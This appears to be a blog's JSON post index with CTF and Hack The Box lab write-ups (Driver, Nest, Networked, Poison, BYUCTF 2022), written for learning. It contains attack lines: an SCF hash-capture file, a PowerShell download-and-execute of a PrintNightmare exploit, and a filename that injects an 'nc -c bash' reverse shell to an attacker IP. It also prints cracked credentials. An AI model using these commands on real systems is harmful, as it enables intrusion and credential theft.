[ { "title": "Driver ‚Äî Hack The Box [Write-up]", "url": "/posts/Driver-Hack-The-Box-Write-up/", "categories": "HackTheBox", "tags": "HTB, Windows", "date": "2022-05-31 18:00:00 +0200", "snippet": "Driver is an easy rated HTB Windows machine, but it discussed a new techniques in exploiting SMB shares and winRM service in addition to privesc using CVE-2021-34527 - PrintNightmare LPE (PowerShell).Let‚Äôs get started.Used Tools: Nmap Metasploit Hashcat Evil-winrm Invoke-WebRequest 1. SCANNING &amp; ENUMERATIONI will start with nmap and the -A parameter to enable OS detection, version detection, script scanning, and traceroute, -p- parameter to scan all the ports not the top 1000 only and append the output to tee command which save the in a file named ‚Äúnmap‚Äù and also show the output on the screen.We found 4 opened ports: 80 for http 135 for RPC client-server communication 445 for SMB 5985 for Windows Remote Management (WinRM)I started with the web page and directly after browsing I found firefox prompting me to enter username and password.I tried by default admin:admin and boom it entered !!!It‚Äôs a Multifunction printer (MFP) Firmware Update site.Nothing works in the site except the Firmware Updates tab, it let‚Äôs me choose the printer model and upload the update file.It also says: ‚ÄúSelect printer model and upload the respective firmware update to our file share‚Äù which means that any uploaded file will directly be uploaded to the file share (SMB), also ‚ÄúOur testing team will review the uploads manually and initiates the testing soon‚Äù which means that there is someone who will review (open the update file).Let‚Äôs continue, What about SMB !!!I tried to list the SMB shares but it denies for unauthorized users2. EXPLOITATION:I stucked here for a while and then found this article: https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/Which states that if I created an .SCF file which will be executed when the user browse it and Adding the @ symbol in front of the filename will place the .scf file on the top of the share drive.create @update_MFP.scf:[Shell]Command=2IconFile=\\\\10.10.16.10\\share\\update.ico[Taskbar]Command=ToggleDesktopThen Metasploit Framework has a module which can be used to capture challenge-response password hashes from SMB clients.sudo msfconsole -quse auxiliary/server/capture/smbrunupload the update_MFP file to the website in the Firmware Updates tab.Return back to the metasploit and see the if it captures anything‚Ä¶Now we want to crack the hash we got for the user tony‚Ä¶First put the hash in a hash.txt file and then execute hashcat with 5600 parameter for the NetNTLMv2 hash type and used rockyou.txt wordlisthashcat -m 5600 hashcat.txt /usr/share/wordlists/rockyou.txtHashcat successfully cracked the NetNTLMv2 hash.Now we have creds: tony:liltonyI tried using the new creds to connect to the SMB share but failed‚Ä¶Remember port 5985 for the WinRM Service !!I found in HackTricks website a trick to gain access using evil-winrm toollink: https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrmevil-winrm -u tony -p 'liltony' -i 10.10.11.106BOOOOOOOOM ! We got the user flag.3. PRIVILEGE ESCALATION:Let‚Äôs upload WinPEAS script and see if there is a potential way to escalate our privileges‚Ä¶Ran python server on my local machine and used Invoke-WebRequest on Driver to download WinPEAS from my local machineInvoke-WebRequest -Uri http://10.10.16.10/winPEASx64.exe -OutFile winPEAS.exeThen Run it‚Ä¶I found in the PowerShell history file at: C:\\Users\\tony\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txtReading the file, there is a command ran which adds printer to the system of type RICOH_PCL6After some research I found:CVE-2021-34527 which is a critical remote code execution and local privilege escalation vulnerability dubbed ‚ÄúPrintNightmare.‚ÄùLink: https://github.com/JohnHammond/CVE-2021-34527This exploit is pretty sneaky, what is does is it allows us to create a new user with administrator rights onto the system.Getting the exploit and opening a python server on my local host‚Ä¶After downloading the Powershell script and executing it, it prevents me because running scripts is disabled on this system !!!So I had to find another way‚Ä¶After some research I found a sneaky way in hadrian3689 write-up: https://readysetexploit.wordpress.com/2022/02/26/hack-the-box-driver/, which says:Back in our WinRM session, let us go to a folder where we can easily download like the Downloads directory. And run the following Powershell command to download the Powershell script onto memory iex(new-object net.webclient).downloadstring('http://10.10.16.10/nightmare.ps1')iex(new-object net.webclient).downloadstring('http://10.10.16.10/nightmare.ps1')Invoke-Nightmare -NewUser \"0x3ashry\" -NewPassword \"AdminAdmin\"Exiting our WinRM session and reconnecting with the new credentials‚Ä¶BOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOM !!!! Now we are root :DThank you so much for reading and I hope you learned a lot as I did ‚ù§0x3ashry" }, { "title": "BYUCTF 2022 [Write-up]", "url": "/posts/BYUCTF-2022-Write-up/", "categories": "CTF", "tags": "CTF, Web, Cryptography, Miscellaneous", "date": "2022-05-28 20:00:00 +0200", "snippet": "BYUCTF was a CTF organized by CSA - Cybersecurity Student Association during the period of May 27th to May 28th.We proudly got 5th Place among 435 Competing Teams.Web - WordleWordle was an easy web challange that is inspired from the Wordle game.Basically the game rules is that there is an English 5-letter word you must guess it through try and error, You have only 6 tries. In each try letters are colored by 3 colors Red, Orange and Green. Red means that this letter is incorrect, Orange means it is correct but in the wrong order and green means it is correct and in the right order in the original word.You must use these informations try after try to guess the right word.\\Let‚Äôs move to the challange‚Ä¶It is said in the challange to access http://byuctf.xyz:40003I tried the first word AUDIO but it gave me a hash‚Ä¶There was a zip file attached with the challange so I extracted it, it contains 2 files for the website source code: app.py utils.pyThere was nothing useful except in the utils.py I found getHashString function:def getHashString(guess_status): # guess_status[g_pos] = {\"letter\":g_char, \"state\":1} passString = '' for i in guess_status: if i[\"state\"] == 0: passString += '‚¨õ' elif i[\"state\"] == 1: passString += 'üü®' elif i[\"state\"] == 2: passString += 'üü©' else: passString += '?' hashString = hashlib.md5(passString.encode('utf-8')).hexdigest() return hashStringIt takes my guessed word and append its color to passString and then has that string and return it and this is the hash which I saw on the website, instead of coloring the letters themselves they throw a hash.First I generated all the possible combinations from 0:2.0 is equivalent to Red1 is equivalent to Orange2 is equivalent to Greenand then maipulate getHashString a little bit so that it deals with guess_status as numbers instead of a dictionary and then append the generated hash to all_hashes.function hash_to_colors take the hash and search for it in all hashes and return the corrosponding combination of colors (5 digit integer from 0:2)import hashlibdef getHashString(guess_status): # guess_status[g_pos] = {\"letter\":g_char, \"state\":1} passString = '' hashString = '' for i in guess_status: if i == '0': passString += '‚¨õ' elif i == '1': passString += 'üü®' elif i == '2': passString += 'üü©' hashString = hashlib.md5(passString.encode('utf-8')).hexdigest() return hashStringcombinations = []for a in range(3): for b in range(3): for c in range(3): for d in range(3): for e in range(3): value = str(a) + str(b) + str(c) + str(d) + str(e) combinations.append(value)all_hashes = []for i in range(len(combinations)): all_hashes.append(getHashString(combinations[i]))def hash_to_colors(hashh, all_hashes, colors): for i in range(len(all_hashes)): if hashh == all_hashes[i]: return colors[i]# print(hash_to_colors('', all_hashes, combinations)) # 1st Try# print(hash_to_colors('', all_hashes, combinations)) # 2nd Try# print(hash_to_colors('', all_hashes, combinations)) # 3rd Try# print(hash_to_colors('', all_hashes, combinations)) # 4th Try# print(hash_to_colors('', all_hashes, combinations)) # 5th Try# print(hash_to_colors('', all_hashes, combinations)) # 6th TryI took the generated hash and paste it in hash_to_colors and it gave me 02000 which means that only letter U is correct and in the right orderI used a website to help me solve wordle game faster: https://word.tips/, It gave me a lot of options to try next discarding the bad letters.I tried HUSKY next and continue the same process‚Ä¶Let‚Äôs try PUNCHBOOOOOOOOOOOOOOOOOOOM !!! We got the flag byuctf{b@c0n_grease}Cryptography - XQRXQR was a hard rated cryptography challange and it was in a whole another level.It doesn‚Äôt contain except one massive image contain thousands of QR CodesI first tried to read the first QR Code but it gave me 85TK6eDfb{SXQfvR70VXX !!!Through trial and error I got that the size of each qr code is 27 pixels length and width, so i thought that cutting the whole image into smaller QR codes will make it easierfrom PIL import Imageimggg = Image.open('xqr.png')inc = 27for i in range(0, 2727 , 27): for j in range(0, 2727, 27): box = (j, i, j+27, i+27) # left, top, right, buttom img2 = imggg.crop(box) img2.save(r'QRCodes/myimage_' + str(i) + '_' + str(j) + '_cropped.jpg')Now I have 10,201 QR Codes stored in file called QRCodes, And I stucked for a while‚Ä¶Then I realized from the name of the challange that XQR is near to XOR so what if I XORed all the QR codes together‚Ä¶I started with reading them using cv2 library from python-opencv and then in order to make my trick work I changed the readed image to binary 0 and 1, black and white pixels. Then I XORed each pixel with the same pixels in all the other 10,201 qr codes and saved it, Then displaying the result shows:import cv2import matplotlib.pyplot as pltimport osQR_dir = os.listdir(r\"QRCodes\")qr_codes = []for qr in QR_dir: gray = cv2.imread(\"QRCodes/\" + qr, cv2.COLOR_BGR2GRAY) _, binary = cv2.threshold(gray, 150, 1, cv2.THRESH_BINARY_INV) qr_codes.append(binary)for i in range(27): for j in range(27): for q in range(len(qr_codes)): if q+1 == 10201: break qr_codes[0][i][j] ^= qr_codes[q+1][i][j]plt.imshow(qr_codes[0])plt.show()Scanning it with my phone‚Ä¶BOOOOOOOOOOOOOOOOOOOM !!! We got the flag byuctf{x0r_i5_u5eful}Miscellaneous - ReconstructReconstruct was a medium miscellaneous challange that was new and challanging to me‚Ä¶First he gave ma an MD5 hash for the flag to verify that this is the flag before submission.Whatever let‚Äôs download the file, It is an image containing the flag but was covered with a black bold line‚Ä¶At the end of the file, The lower-case Alphabet and the numbers were attached to use them in the process of identifying the flag‚Ä¶I solved it manually by comparing the sizes of the letters, and here were the steps: The Underscore _ was obviously so I wrote the flag format as this: byuctf{XXXX_XXXX_XXX_XXXXXXXX_XX_XXXX_X_XXX_XXXXXXXXXXX_XX} Then I detected the characters with 2 tips down as the h,n byuctf{XXXn_XXXh_XhX_XXXXXXXX_XX_XnXX_X_XXn_XXXXnXXXXXX_XX} The number 1 also was obviousbyuctf{XXXn_X1Xh_XhX_X1XXXXXX_XX_1nXX_1_XXn_XXXXnXXXXXX_1X} There were 2 simillar letters which were t and l both of them are written nearly close to each other with one small different which is the t letter‚Äôs down tip has a taller curvebyuctf{XXXn_X1th_thX_l1ttlXXt_XX_1nXX_1_XXn_XXXXnXtXXXt_1t} The f also was pretty obviousbyuctf{XXXn_X1th_thX_l1ttlXXt_Xf_1nfX_1_XXn_XXXXnXtXXXt_1t} I was stuck to differentiate between a,c,e,o,s,u all of them have a curve and very similar to each other, but the letter o have a more perfect circle when you focus morebyuctf{XXXn_X1th_thX_l1ttlXXt_of_1nfo_1_XXn_XXXXnXtXXXt_1t} After sometime I noticed that the v,w‚Äôs tips are little bit more bold and centered in the middle of the letter‚Äôs placebyuctf{XvXn_w1th_thX_l1ttlXXt_of_1nfo_1_XXn_XXXXnXtXXXt_1t} there were remaining tips that are shifted leftward and isn‚Äôt classified yet, I had no option except the r letter which was a smart choicebyuctf{XvXn_w1th_thX_l1ttlXXt_of_1nfo_1_XXn_rXXXnXtrXXt_1t} the third word was obvious to be the Now the generated words are: XvXn with the littlXXt of info i XXn rXXXnXtrXXt itXvXn ‚Äì&gt; can‚Äôt know what it isl1ttlXXt ‚Äì&gt; guessed to be l1ttlestXXn ‚Äì&gt; can‚Äôt know what it isrXXXnXtrXXt ‚Äì&gt; I count the number of letters and they happened to be equal to the word reconstruct which is the challange name, BingoooooNow the flag is byuctf{XvXn w1th the l1ttlest of 1nfo 1 XXn reconstruct 1t}I guessed the word XXn ‚Äì&gt; canThen stucked for a while trying words that similar to XvXn and figured out that it is evenNow my flag is byuctf{even_w1th_the_l1ttlest_of_1nfo_1_can_reconstruct_1t}To validate it I ran this script to generate the flag‚Äôs hash and compare it to the one in the description‚Ä¶def validate(strr, hash): strr = hashlib.md5(strr.encode('utf-8')).hexdigest() if strr == hash: print(\"True\") else: print(\"False\")def validate2(strr, hash): strr = strr[7:-1] strr = hashlib.md5(strr.encode('utf-8')).hexdigest() if strr == hash: print(\"True\") else: print(\"False\")flag = \"byuctf{even_w1th_the_l1ttlest_of_1nfo_1_can_reconstruct_1t}\"validate(flag,\"63b1424fa6fe8aa81d9ce4b5637f7acd\")BOOOOOOOOOOOOOOOOOOOM !!! The flag was rightMiscellaneous - ProbablyProbably was an easy Miscellaneous challange that uses netcat to connect to byuctf and displays some sort of message‚Ä¶I connected to the server using windows version of netcat:nc64.exe byuctf.xyz 40004It displayed a large message and disconnected, rerun it again it displays different undefined message and disconnectedThere was a python script attached with the challange, I opened it and found it does the following: Opens the flag file and read it Calls random_string function which changes the characters of the flag according to a random number from 0:1, If the random number &lt; 0.25 the current character remains as it is, else it is replaced with another random character Then the generated string (new_string) will be displayed using pyfiglet.figlet_format function which displays it in the format we saw in the cmd #!/usr/bin/env python3import stringimport randomimport pyfigletfrom pathlib import Pathimport osdef open_file(filename): ''' open a file by name and return the first line ''' with open(filename, 'r') as f: file = [] for line in f.readlines(): file.append(line.strip()) return filedef random_string(s): ''' randomly changes characters in the string returns the new string ''' new_string = '' for char in s: print(\"Original char = \" + char) if random.random() &lt; 0.25: # print(\"[1] - \" + str(random.random())) new_string += char else: new_char = random.choice(string.ascii_lowercase + string.digits + \"_\") print(\"[2] - \" + str(new_char)) new_string += new_char print() return new_stringdef main(): flag = open_file(os.path.join(os.path.abspath( os.path.dirname(__file__)), 'flag.txt')) print() print(flag) print(random_string(flag)) #print(pyfiglet.figlet_format(random_string(flag)))if __name__ == \"__main__\": main()If I could store number of strings I can use the fact that there is 25% chance that the actual letter remains as it is and 75% it is replaced with another random letter, So what about generating 20 string and in each character calculate the most appeared character which in most casses will be the actual letter from the flag.Let‚Äôs test my theory‚Ä¶I ran the netcat connection 20 times and wrote the returned string in a separate text file and this was the result:by9ctfi48xz_mku8hhzpheaqceh1p5yp9p9s}ndu7pd{wtg55pxy3dedr2hrngtqhgeehdflm3brunufoohsruai__bujgi5hoaexqaeeu3ocbi2nr0136wrfmwdveao2o_ih22cnb_2h4qlpckhbkyumf1w6tymacasthwkc9slclw6ug0r6mc2clbeiefvihid_l2e5ime_cfl0oee_5spqw0csy2rscm_qghpnxatjt0h1zch_hc2ec3keozntgioypbrjt2hbn2are_mghveprkxns_3oeppfc5zb6uytx6w8atndrlxblv9cmynvew35cap2ifs}g36ki2mwhkqpxjegtxdpcxa_tesmb1em3dab3eylvk7la8elnarp_t_6_n8qa1buohxqewua2sb8u2xfk1ha5a1ran8hu_8hnncxue798mhfcl}fwusmfj_0kt_nrh1th7hmb2ns71_3kl5n_18}youqtfzvhuva09etphik3hoc3_rt7cep32dhlbyujrnd41a5_t4d6tkeqc7af09vm36mkhycsb0vrrxsvw7qbzbpybb6s_6hanunq51e_hjfsp}2y9zqfowhmtns864n8s_yilqchaw7de6pn0mqlk43zix74wt2wb_e9sg_ahxncyscte_p_cc1w1y9caeywkj4_drojahcz5_fnpks_7vjp158stggrf64jynpv_amm5zke3chnoqdthxlepjfas6_yuclfuilae_jrj_1he_cx2nc1st3j795feuvThen I wrote a python script that takes each letter and loops on the whole text file get the most appearing letter in this position and so on‚Ä¶def open_file(filename): ''' open a file by name and return the first line ''' with open(filename, 'r') as f: file = [] for line in f.readlines(): file.append(line.strip()) return filedef decrypt(flags): # flags = ['by9ctfi48xz_mku8hhzpheaqceh1p5yp9p9s}', 'ndu7pd{wtg55pxy3dedr2hrngtqhgeehdflm3', 'brunufoohsruai__bujgi5hoaexqaeeu3ocbi', ...etc] dict = {} flag = \"\" for i in range(len(flags[0])): for j in range(len(flags)): if flags[j][i] in dict.keys(): dict[flags[j][i]] += 1 else: dict[flags[j][i]] = 1 bigger = 0 bigger_char = '' for char in dict: if dict[char] &gt; bigger: bigger = dict[char] bigger_char = char flag += bigger_char dict = {} return flagenc_flags = open_file(r\"encrypted_flags_simplified.txt\")x = decrypt(enc_flags)print(x)It generated: byuctfowhat_are_the_chances_3eep3fcs} which missed the { so I replaced it and BOOOOOOOOOOOOOOOOOOOM !!! The flag was right" }, { "title": "Nest ‚Äî Hack The Box [Write-up]", "url": "/posts/Nest-Hack-The-Box-Write-up/", "categories": "HackTheBox", "tags": "HTB, Windows", "date": "2022-05-25 16:00:00 +0200", "snippet": "Nest is one of the most challenging easy machines on HTB including a lot of new aspects as cryptography, de-compiling .Net application and extensive work with SMB shares.So let‚Äôs get started‚Ä¶Used Tools: nmap smbmap smbclient mount telnet psexec.py1. SCANNING &amp; ENUMERATIONI will start with nmap and the -A parameter to enable OS detection, version detection, script scanning, and traceroute and append the output to tee command which save the in a file named ‚Äúnmap‚Äù and also show the output on the screen.We found 2 opened ports: 445 for SMB 4386 Unkown serviceOf course let‚Äôs start with the smb and try mapping its sharessmbmap -H 10.10.10.178 -u AnonymousFound 2 shares with read access only: Data UsersLet‚Äôs start with Data and connect to it using smbclientsmbclient -U \"\" //10.10.10.178/DataAfter some directory traversing I found a file under \\Shared\\Templates\\HR called ‚ÄúWelcome Email.txt‚Äù which looks interesting‚Ä¶After downloading it, found that it was a welcome email sent from HR to a new user called TempUser with username and password.Let‚Äôs connect again with the new creds‚Ä¶smbclient -U \"TempUser\" --password welcome2019 //10.10.10.178/DataI found that now I have access to the IT directoryBut it has a lot of files so let‚Äôs mount it and have a local copy of it, it would be easiersudo mount -o user=TemUser -t cifs //10.10.10.178/Data /mnt/nest2. EXPLOITATION:After some directory traversing I found 2 very important files: RU_config.xml ‚Äì&gt; //10.10.10.179/Data/IT/Configs/RU Scanner/RU_config.xml config.xml ‚Äì&gt; //10.10.10.179/Data/IT/Configs/NotepadPlusPlus/config.xmlRU_config contain Username C.smith and encrypted passwordBut it is encrypted so we had to continue‚Ä¶config.xml contains a special path in a share called Secure$I tried smbmap again with the new creds and found that we have access to Secure$, So let‚Äôs connect to it‚Ä¶smbclient -U \"TempUser\" --password welcome2019 //10.10.10.178/Secure$I couldn‚Äôt list the contents of IT but navigating to /IT/Carl found a lot of filesMounting Secure$‚Ä¶sudo umount /mnt/nest; sudo mount -o user=TempUser -t cifs //10.10.10.178/Secure$ /mnt/nest/cd /mnt/nest/cd IT/Carlfind .Found file called Module1.vb at and it loads RU_Config.xml and calles a function called DecryptString from a library called Utils which is interesting‚Ä¶I found also a file called Utils.vb which i think is the called libraryIt is a library that have 4 functions, 2 for password encoding and other 2 for password decodingDecryptString function which was called previously calls Decrypt function which is an AES Encryption cypher with predefined values for the passphrase, salt, number of iterations, initvector and key size in the DecryptString function Public Shared Function DecryptString(EncryptedString As String) As String If String.IsNullOrEmpty(EncryptedString) Then Return String.Empty Else Return Decrypt(EncryptedString, \"N3st22\", \"88552299\", 2, \"464R5DFA5DL6LE28\", 256) End If End Function Public Shared Function Decrypt(ByVal cipherText As String, _ ByVal passPhrase As String, _ ByVal saltValue As String, _ ByVal passwordIterations As Integer, _ ByVal initVector As String, _ ByVal keySize As Integer) _ As String Dim initVectorBytes As Byte() initVectorBytes = Encoding.ASCII.GetBytes(initVector) Dim saltValueBytes As Byte() saltValueBytes = Encoding.ASCII.GetBytes(saltValue) Dim cipherTextBytes As Byte() cipherTextBytes = Convert.FromBase64String(cipherText) Dim password As New Rfc2898DeriveBytes(passPhrase, _ saltValueBytes, _ passwordIterations) Dim keyBytes As Byte() keyBytes = password.GetBytes(CInt(keySize / 8)) Dim symmetricKey As New AesCryptoServiceProvider symmetricKey.Mode = CipherMode.CBC Dim decryptor As ICryptoTransform decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes) Dim memoryStream As IO.MemoryStream memoryStream = New IO.MemoryStream(cipherTextBytes) Dim cryptoStream As CryptoStream cryptoStream = New CryptoStream(memoryStream, _ decryptor, _ CryptoStreamMode.Read) Dim plainTextBytes As Byte() ReDim plainTextBytes(cipherTextBytes.Length) Dim decryptedByteCount As Integer decryptedByteCount = cryptoStream.Read(plainTextBytes, _ 0, _ plainTextBytes.Length) memoryStream.Close() cryptoStream.Close() Dim plainText As String plainText = Encoding.ASCII.GetString(plainTextBytes, _ 0, _ decryptedByteCount) Return plainText End FunctionAll we have to do is to re run the code but replacing the EncryptedString parameter in DecryptString with our password hash we found for C.smith‚Ä¶I will use online VB compiler from codingrooms.com and add the previous 2 function in addition to this submain function to call them:Sub Main() Dim password as String password = DecryptString(\"fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=\") Console.WriteLine(password)End SubYou‚Äôll find the code here: https://pastebin.com/1SAnwkSbWe successfully decrypted the hash: xRxRxPANCAK3SxRxRxNow let‚Äôs access the Users share with the C.smith credsBOOOOOOOOM ! We got the user flag.3. PRIVILEGE ESCALATION:Along with the user flag, we find a folder HQK Reporting that contains an executable file called HqkLdap.exe in a subfolder called AD Integration Module. We get as well a strange empty file called Debug Mode Password.txt:So let‚Äôs mount the share and see itsudo umount /mnt/nest; sudo mount -o user=C.smith -t cifs //10.10.10.178/Users /mnt/nest/cd \"/mnt/nest/C.smith/HQK Reporting\"Seems like the service running on port 4386 is called HQK Reporting.Connect to it using telnettelnet 10.10.10.178 4386I didn‚Äôt reach anything through the application‚Ä¶I stucked a lot but then found this thread talking about Sth called Alternate Data streams (ADS) over SMBLINK: https://superuser.com/questions/1520250/read-alternate-data-streams-over-smb-with-linuxsmbclient -U C.Smith \\\\\\\\10.10.10.178\\\\Users -c 'allinfo \"C.Smith/HQK Reporting/Debug Mode Password.txt\"'Indeed it seems like there is an ADS with 15 bytes of data.Connecting to the SMB client and downloading the Debug Mode Password.txt with the ADS using:smbclient -U C.Smith \\\\\\\\10.10.10.178\\\\Userscd \"C.Smith\\HQK Reporting\\\"get \"Debug Mode Password.txt:Password:$DATA\"Shows a password that I think it could be used for the DEBUG mode in HQK Reporting‚Ä¶Trying it and it successfully enabled DEBUG mode and we have a new privilegesSHOWQUERY in combination with SETDIR and LIST gives us arbitrary file-read.Using .. for the SETDIR command we can traverse our path and using SHOWQUERY we can read Ldap.conf, which contains the encrypted password for the administrator user.It looks like the old encrypted password for TempUser but I thing the values of the AES Cyphed differ this time so we have to find where the Encryption code is to decode it as previouslyLet us download the HqkLdap.exe file and decompile it to decrypt the administrator password.I used dotPeek to decode it.At the CR Class in the HqkLdap I found the encryption and decryption functionsRepeating the previous decryption steps with changing the values of DecryptString function I managed to get the Administrator passwordNow that we have the Administrator password , we can use psexec.py to get a shell as adminBOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOM !!!! Now we are root :DThank you so much for reading and I hope you learned a lot as I did ‚ù§0x3ashry" }, { "title": "Networked ‚Äî Hack The Box [Write-up]", "url": "/posts/Networked-Hack-The-Box-Write-up/", "categories": "HackTheBox", "tags": "HTB, Linux", "date": "2022-05-21 17:10:00 +0200", "snippet": "Networked is an easy rated Linux retired machine, with a white-box pentesting to exploit an upload vulnerability and get user privilege and then exploiting Redhat/CentOS network-scripts vulnerability to get root.Let‚Äôs get started.Used Tools: nmap gobuster tar netcat touch1. SCANNING &amp; ENUMERATIONI will start with nmap and the -A parameter to enable OS detection, version detection, script scanning, and traceroute and append the output to tee command which save the in a file named ‚Äúnmap‚Äù and also show the output on the screen.We found 2 opened ports: 22 for an SSH 80 for an HTTP serverChecking the http page found nothing‚Ä¶Checking the source code found a comment declaring that there are 2 pages called upload and gallerytried access upload and gallery pages but got nothing, So tried directory bruteforcing‚Ä¶gobuster dir -u http://10.10.10.146/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o directory.txt 2&gt;/dev/nullFound /uploads, /backup/uploads file contain nothing but /backup file contain backup.tar filedownloading the file and extracting it, Found 4 php code files‚Ä¶tar xvf backup.tarAfter some careful analysis of the files, one thing I noticed was the way images are checked in the upload.php file (based on their Content-Type and file extension).Another thing that stood out for me, was the fact that all error messages were uniquely identifiable so that you could easily track where you made a mistake which is a very big mistake in the development process to not double check that the error messages are the same.upload.php:Here it check the mime-type and the file size &lt; 6mb.The mime-type check included a dot at the end of the message.Note: check_file_type() is a function in the lib.php file that check the mime-type of the uploaded file if (!(check_file_type($_FILES[\"myFile\"]) &amp;&amp; filesize($_FILES['myFile']['tmp_name']) &lt; 60000)) { echo '&lt;pre&gt;Invalid image file.&lt;/pre&gt;'; displayform(); }While the extension check did not! //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile[\"name\"]; list ($foo,$ext) = getnameUpload($myFile[\"name\"]); $validext = array('.jpg', '.png', '.gif', '.jpeg'); $valid = false; foreach ($validext as $vext) { if (substr_compare($myFile[\"name\"], $vext, -strlen($vext)) === 0) { $valid = true; } } if (!($valid)) { echo \"&lt;p&gt;Invalid image file&lt;/p&gt;\"; displayform(); exit; }So after further analysis of the files, I decided to check the files that I had not yet discovered for their existence on the web server.Uploaded photos are displayed in teh http://10.10.10.164/photos.phphttp://10.10.10.164/upload.php contain an upload form for image uploading‚Ä¶index.php is the same as the default page and lib.php isn‚Äôt displayed of course because its a library file contain function used in /upload.php and /photos.php2. EXPLOITATIONI tried to upload normal images to check the flow of the application is as I thought.Let‚Äôs use php-reverse-shell.php under /usr/share/webshells/php/ and make modificatins to it in order to bypass security conditions.Append ‚ÄúGIF89a;‚Äù at the top of the file inorder to bypass the mime-type filtering‚Ä¶and modify the $ip and $port for the local IP and the listening port we will be listening at‚Ä¶Then rename the file to php-findsock-shell.php.gif and upload it to /upload.phpThe file is uploaded successfully.Create a listener on our local machine and then reload http://10.10.10.146/photos.phpIt will keep loading, Let‚Äôs check our netcat listener‚Ä¶BOOOOOOOOM ! We successfully gained a shell for apache user.but our user don‚Äôt have read permissions on the user flag as it belong to a user called guly.3. PRIVILEGE ESCALATION:I. Upgrade to gulyIn the /home/guly there is a file called crontab.gulyAfter reading it‚Äôs content I found that it‚Äôs a crontab file that executes /home/guly/check_attack.php every 3 minutes.Let‚Äôs read check_attach.php file‚Ä¶&lt;?phprequire '/var/www/html/lib.php';$path = '/var/www/html/uploads/';$logpath = '/tmp/attack.log';$to = 'guly';$msg= '';$headers = \"X-Mailer: check_attack.php\\r\\n\";$files = array();$files = preg_grep('/^([^.])/', scandir($path));foreach ($files as $key =&gt; $value) { $msg=''; if ($value == 'index.html') { continue; } #echo \"-------------\\n\"; #print \"check: $value\\n\"; list ($name,$ext) = getnameCheck($value); $check = check_ip($name,$value); if (!($check[0])) { echo \"attack!\\n\"; # todo: attach file file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX); exec(\"rm -f $logpath\"); exec(\"nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;\"); echo \"rm -f $path$value\\n\"; mail($to, $msg, $msg, $headers, \"-F$value\"); }}?&gt;After analyzing the script, it checks all files in the /var/www/html/uploads directory and then performs an rm -f on each file. However, if I can create a filename that looks just like a linux command, it will execute that just the same.Let‚Äôs navigate to /var/www/html/uploads and write our file there‚Ä¶touch \"; nc -c bash 10.10.16.10 5555\"Create a listener on port 5555 and wait for a connection‚Ä¶BOOOOOOOOM ! We successfully upgraded to guly user and have the user.txt flagII. Upgrade to rootLet‚Äôs see if there are commands guly could execute as a root.sudo -lguly can execute /usr/local/sbin/changename.sh as a root without any password requiredReading the content of changename.sh‚Ä¶#!/bin/bash -pcat &gt; /etc/sysconfig/network-scripts/ifcfg-guly &lt;&lt; EoFDEVICE=guly0ONBOOT=noNM_CONTROLLED=noEoFregexp=\"^[a-zA-Z0-9_\\ /-]+$\"for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do echo \"interface $var:\" read x while [[ ! $x =~ $regexp ]]; do echo \"wrong input, try again\" echo \"interface $var:\" read x done echo $var=$x &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-gulydone /sbin/ifup guly0The script reads the /etc/sysconfig/network-scripts/ifcfg-guly file and append to it NAME, PROXY_METHOD, BROWSER_ONLY, BOOTPROTO by taking them as an input from the user‚Ä¶Searching about the ifcfg-guly file I found this article: https://seclists.org/fulldisclosure/2019/Apr/24Which says that this file in CentOS is vulnerable:If, for whatever reason, a user is able to write an ifcf- script to /etc/sysconfig/network-scripts or it can adjust an existing one, **then your system in pwned**.In my case, the NAME= attributed in these network scripts is not handled correctly. If you have white/blank space in the name the system tries to execute the part after the white/blank space.Which means; everything after the first blank space is executed as root.Let‚Äôs try to apply this and execute changename.sh‚Ä¶Note: I will type test as an input in the 4 required fields during the execution of the script, and in the Name: parameter I will type test /bin/bash to execute /bin/bash as rootBOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOM !!!! Now we are root :DThank you so much for reading and I hope you learned a lot as I did ‚ù§0x3ashry" }, { "title": "Poison ‚Äî Hack The Box [Write-up]", "url": "/posts/Poison-Hack-The-Box-Write-up/", "categories": "HackTheBox", "tags": "HTB, Linux", "date": "2022-05-09 22:00:00 +0200", "snippet": "Poison is a Medium rated FreeBSD retired box, but an enjoyable one with easy user access and good privesc.Let‚Äôs get started.Used Tools: Nmap Cyberchef Unzip SSH Wget Linpeas.sh1. SCANNING &amp; ENUMERATIONI will start with nmap and the -A parameter to enable OS detection, version detection, script scanning, and traceroute and append the output to tee command which save the in a file named ‚Äúnmap‚Äù and also show the output on the screen.We found 2 opened ports: 22 for an SSH 80 for an HTTP serverI tried anonymous login in the ssh but it didn‚Äôt work so I jumbed directly to the http‚Ä¶All I found is a temporary website to test local .php scriptsIt says that the scripts or sites to be tested are ini.php, info.php, listfiles.php, phpinfo.phpI tried them all and but when I tried listfiles.php it showed me a list of the files in there‚Ä¶There is an interesting file called pwdbackup.txt, What if we put it in the script name field in the temporary website and see if it will accept itIt said ‚ÄúThis password is secure, it‚Äôs encoded atleast 13 times.. what could go wrong really.. ‚Äú and have a very long base64 passwordI will try decoding it 13 times using CyberchefCyberchef: https://gchq.github.io/CyberChef/I applied From Base64 module 12 times and it reveals a password Charix!2#4%6&amp;8(02. EXPLOITATION:I tried ssh with creds username:charix (this was a guess because it wass the prefix of the password) and password:Charix!2#4%6&amp;8(0BOOOOOOOOOOOOOOOOOOOOOOOOOOOM ! We successfully gained a ssh shell for charix with the user flag in the home directory3. PRIVILEGE ESCALATION:I found beside user.txt file a filename called secret.zip I tried to unzip it in Poison but it required a passphrase so I transfered it to kali and tried to unzip it there‚Ä¶I found python module installed in poison so I will open python http server and get the secret.zip file from there‚Ä¶python -m SimpleHTTPServer 8080At kaliwget http://10.10.10.84:8080/secret.zipAnd it is transfered successfully.Let‚Äôs Unzip itunzip 